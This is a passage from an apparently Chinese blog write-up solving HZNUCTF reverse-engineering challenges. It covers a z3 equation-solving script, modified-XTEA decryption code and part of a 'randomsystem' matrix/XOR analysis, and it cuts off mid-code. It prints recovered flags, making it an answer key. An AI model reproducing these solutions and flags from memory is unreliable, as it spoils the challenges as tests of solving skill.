&#39;6&#39;,\n        &#39;1&#39;: &#39;&#125;&#39;\n    &#125;\n    char_map.update(remaining_map)\n    \n    result &#x3D; &quot;HZNUCTF&#123;&quot;\n    for num in mapping:\n        result +&#x3D; char_map[num]\n    \n    return result\n\ns &#x3D; Solver()\n\nEnc &#x3D; [Int(f&#39;x&#123;i&#125;&#39;) for i in range(30)]\n\ns.add(7 * Enc[0] &#x3D;&#x3D; 504)\ns.add(9 * Enc[0] - 5 * Enc[1] &#x3D;&#x3D; 403)\ns.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] &#x3D;&#x3D; 799)\ns.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] &#x3D;&#x3D; 2938)\ns.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] &#x3D;&#x3D; 2042)\ns.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] &#x3D;&#x3D; 1225)\ns.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] &#x3D;&#x3D; 7975)\ns.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] &#x3D;&#x3D; 229)\ns.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] &#x3D;&#x3D; 2107)\ns.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] &#x3D;&#x3D; 4037)\ns.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] &#x3D;&#x3D; 4950)\ns.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] &#x3D;&#x3D; 12544)\ns.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] &#x3D;&#x3D; 6585)\ns.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] &#x3D;&#x3D; 6893)\ns.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] &#x3D;&#x3D; 1883)\ns.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] &#x3D;&#x3D; 8257)\ns.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] &#x3D;&#x3D; 5847)\ns.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] &#x3D;&#x3D; 18257)\ns.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] &#x3D;&#x3D; 12591)\ns.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] &#x3D;&#x3D; 52041)\ns.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] &#x3D;&#x3D; 20253)\ns.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] &#x3D;&#x3D; 18768)\ns.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] &#x3D;&#x3D; 111844)\ns.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] &#x3D;&#x3D; 159029)\ns.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] &#x3D;&#x3D; 2762025)\ns.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] &#x3D;&#x3D; 1551621)\ns.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] &#x3D;&#x3D; 948348)\ns.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] &#x3D;&#x3D; 777044)\ns.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] &#x3D;&#x3D; 185016)\ns.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] &#x3D;&#x3D; 130106)\n\nfor x in Enc:\n    s.add(x &gt;&#x3D; 32)\n    s.add(x &lt;&#x3D; 126)\n\nif s.check() &#x3D;&#x3D; sat:\n    m &#x3D; s.model()\n\n    solution &#x3D; [m[x].as_long() if m[x] is not None else 0 for x in Enc]\n    \n    decrypted &#x3D; decrypt(solution)\n    print(decrypted)\n    \nelse:\n    print(&quot;No solution found&quot;)</code></pre>\n\n<p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p>\n<h3 id=\"XTEA\"><a href=\"#XTEA\" class=\"headerlink\" title=\"XTEA\"></a>XTEA</h3><p>初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。</p>\n<p>红框处是将输入字符串四个四个一组进行翻转。</p>\n<p><img src=\"/images/1744633170177-8.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>InitKey函数是用rand初始化了四个整数Key。</p>\n<p><img src=\"/images/1744633170177-9.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>XTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。</p>\n<p><img src=\"/images/1744633170177-10.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，<strong>2654435769 -&gt; 0x9E3779B9</strong></p>\n<p>直接编写解密，使用该Delta就可以解出flag。</p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>__fastcall <span class=\"token function\">dec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> a4<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [rsp+24h] [rbp+4h]</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [rsp+44h] [rbp+24h]</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [rsp+64h] [rbp+44h]</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>                <span class=\"token comment\">// [rsp+84h] [rbp+64h]</span>\n\n    v5 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">;</span>\n    v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v7 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>a1 <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        v6 <span class=\"token operator\">-=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a4 <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">>></span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v7<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v5 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        v7 <span class=\"token operator\">+=</span> a1<span class=\"token punctuation\">;</span>\n        v5 <span class=\"token operator\">-=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a4 <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v7 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> v7<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v6 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v6 <span class=\"token operator\">>></span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token operator\">*</span>a2 <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span>\n    result <span class=\"token operator\">=</span> a3<span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span>a3 <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7e8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 初始化Key</span>\n    <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">dec</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x9E3779B9</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">*</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token punctuation\">)</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 四个字节一组进行翻转</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> tmp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buffer <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.32s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p>\n<h3 id=\"randomsystem\"><a href=\"#randomsystem\" class=\"headerlink\" title=\"randomsystem\"></a>randomsystem</h3><p>第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。</p>\n<p>如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符’5’,’2’,’6’,’5’。</p>\n<p><img src=\"/images/1744633170177-11.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。</p>\n<pre class=\"language-none\"><code class=\"language-none\">0101001001100101010101100110010101010010011001010101001101100101</code></pre>\n\n<p>底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。</p>\n<p>第一部分用固定种子的随机数初始化了一个v18数值列表。</p>\n<p><img src=\"/images/1744633170177-12.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>然后进行四次加密。</p>\n<p><img src=\"/images/1744633170177-13.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>Enc1是用随机数初始化的列表进行打乱输入字符串的顺序。</p>\n<p><img src=\"/images/1744633170177-14.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>Enc2是将输入字符串转存到另一个二维数组。</p>\n<p><img src=\"/images/1744633170177-15.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>第三个函数是将之前输入转换后的Key存到”Str”中，实际值就是<strong>ReVeReSe</strong></p>\n<p>第四个函数是用一个全局的矩阵乘上输入数据。</p>\n<p><img src=\"/images/1744633170178-16.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>最后和Key进行循环异或加密。</p>\n<p><img src=\"/images/1744633170178-17.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。</p>\n<p>Enc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。</p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token 